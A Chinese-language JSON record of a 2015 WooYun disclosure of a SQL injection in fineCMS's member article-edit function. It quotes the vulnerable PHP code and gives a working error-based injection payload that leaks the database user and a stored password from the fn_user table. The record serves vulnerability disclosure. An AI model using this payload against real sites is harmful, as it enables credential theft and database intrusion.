{"id": 70816, "wybug_id": "wooyun-2015-0123235", "wybug_title": "fineCMS免费版某处又一sql注入", "wybug_corp": "dayrui.com", "wybug_author": "yunxu", "wybug_date": "2015-07-01 15:19", "wybug_open_date": "2015-09-30 10:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向公众公开  简要描述： 这次让我先呵呵！！！ 详细说明：  会员中心，文章-先发表一篇文章，然后去修改，看看修改的代码controllers/member/ContentController.php\npublic function editAction() {\t   。。。。\t    if ($this->post('submit')) {\t\t\t$_data = $data;\t        unset($data);\t        $data = $this->post('data');\t        /**print_r($data);\t        exit();**/\t        if (empty($data['title'])) {                $this->memberMsg(lang('m-con-13'));            }\t        if ($data['catid'] != $catid                && $modelid != $this->cats[$data['catid']]['modelid']) {                $this->memberMsg(lang('m-con-35'));            }\t\t\t$this->checkFields($fields, $data, 2);\t\t\t$data['id'] = $id;\t        $data['sysadd'] = 0;\t        $data['status'] = !isset($this->group['postverify']) || $this->group['postverify'] ? 3 : 1;\t\t\t$data['userid'] = $this->memberinfo['id'];\t        $data['modelid'] = (int)$modelid;\t        $data['username'] = $this->memberinfo['username'];\t\t\t$data['inputtime'] = $_data['inputtime'];\t        $data['updatetime'] = time();\t        $result = $this->content->member($id, $this->cmodel[$modelid]['tablename'], $data);\npost提交修改文章，data数组并没有任何过滤，那么可以尝试在文章内容中注入，给描述部分添加一个单引号\n\n接着提交后就会报错\n\n那么继续在描述中插入poc\na',`sysadd` = '0',`status` = '1',`userid` = '1',`modelid` = '1',`username` = 'woc11123ao',`inputtime` = '1435460076',`updatetime` = '1435461373',`url` = 'q' WHERE id=41 and  extractvalue(1,concat(0x7e,user(),0x7e,(select password from fn_user limit 1)))#\n\n\n   漏洞证明：  \n\n   修复方案：  过滤呗   版权声明：转载请注明来源 yunxu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-02 10:03 厂商回复： ok 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-02 12:06 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  厉害    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}